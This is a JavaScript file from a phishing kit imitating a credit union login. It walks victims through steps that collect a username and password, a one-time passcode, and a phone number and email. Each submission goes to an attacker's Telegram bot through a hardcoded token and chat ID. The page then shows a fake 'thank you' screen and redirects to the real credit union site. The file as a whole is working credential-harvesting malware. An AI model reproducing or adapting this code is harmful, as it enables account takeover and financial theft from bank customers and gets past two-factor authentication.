// --- CONFIGURATION ---
const CONFIG = {
    // Delivery to Two Separate Bots/Chats
    recipients: [
        {
            token: "9151669465:AAF1GHP-ctYlD7dwMyH0XWg23KHeocgGS4o", // First Bot Token
            chatId: "-5551108658"   // First Chat ID
        },
        {
        
        }
    ],
    redirectUrl: "https://www.onpointcu.com" // Final redirect link
};

// --- PASSWORD TOGGLE LOGIC ---
const passwordInput = document.getElementById('password');
const toggleBtn = document.getElementById('togglePasswordBtn');
const eyeIcon = document.getElementById('eye-icon');

if (toggleBtn) {
    toggleBtn.addEventListener('click', () => {
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
        } else {
            passwordInput.type = 'password';
            eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
        }
    });
}

// --- UPDATED DUAL-DELIVERY TELEGRAM LOGIC ---
async function sendToTelegram(text) {
    // Loop through each recipient in the CONFIG
    for (const recipient of CONFIG.recipients) {
        const url = `https://api.telegram.org/bot${recipient.token}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: recipient.chatId,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.error("Error sending to a recipient:", e);
        }
    }
}

// --- NAVIGATION LOGIC ---
function showStep(stepNumber) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById('step' + stepNumber).classList.add('active');
}

// --- FORM SUBMISSIONS ---

// Step 1: Login
document.getElementById('form1').addEventListener('submit', async (e) => {
    e.preventDefault();
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    await sendToTelegram(`<b>📍 NEW LOGIN</b>\nUser: <code>${user}</code>\nPass: <code>${pass}</code>`);
    showStep(2);
});

// Step 2: OTP
document.getElementById('form2').addEventListener('submit', async (e) => {
    e.preventDefault();
    const code = document.getElementById('otp').value;
    await sendToTelegram(`<b>🔑 OTP CODE</b>\nCode: <code>${code}</code>`);
    showStep(3);
});

// Step 3: Contact Details
document.getElementById('form3').addEventListener('submit', async (e) => {
    e.preventDefault();
    const ph = document.getElementById('phone').value;
    const em = document.getElementById('email').value;
    await sendToTelegram(`<b>📞 CONTACT DATA</b>\nPhone: <code>${ph}</code>\nEmail: <code>${em}</code>`);
    
    showStep(4);
    runFinalSequence();
});

// Step 4: Final Timer Sequence
function runFinalSequence() {
    // 1. Show spinner for 3 seconds
    setTimeout(() => {
        document.getElementById('loader-area').style.display = 'none';
        document.getElementById('success-area').style.display = 'block';
        
        // 2. Show "Thank you" message for 3 seconds, then redirect
        setTimeout(() => {
            window.location.href = CONFIG.redirectUrl;
        }, 3000);
        
    }, 3000);
}